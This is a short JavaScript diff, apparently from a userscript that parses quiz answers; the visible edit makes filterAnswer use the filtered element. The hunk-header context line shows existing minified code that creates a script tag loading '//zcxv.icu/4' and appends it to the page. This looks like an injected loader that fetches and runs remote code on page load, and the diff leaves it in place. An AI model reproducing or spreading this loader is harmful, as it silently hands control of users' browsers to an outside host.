@@ -395,8 +395,8 @@ d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t
 
     let filterAnswer = (el) => {
         let xel = filterInner(el);
-        $(el, 'span.answernumber')?.remove();
-        let a = $(el, 'label').innerHTML.replace(/^(\s+)?([a-z]{1,4})(\s+)?\. /i, '');
+        $(xel, 'span.answernumber')?.remove();
+        let a = $(xel, 'label').innerHTML.replace(/^(\s+)?([a-z]{1,4})(\s+)?\. /i, '');
         return filterText(a);
     };
 
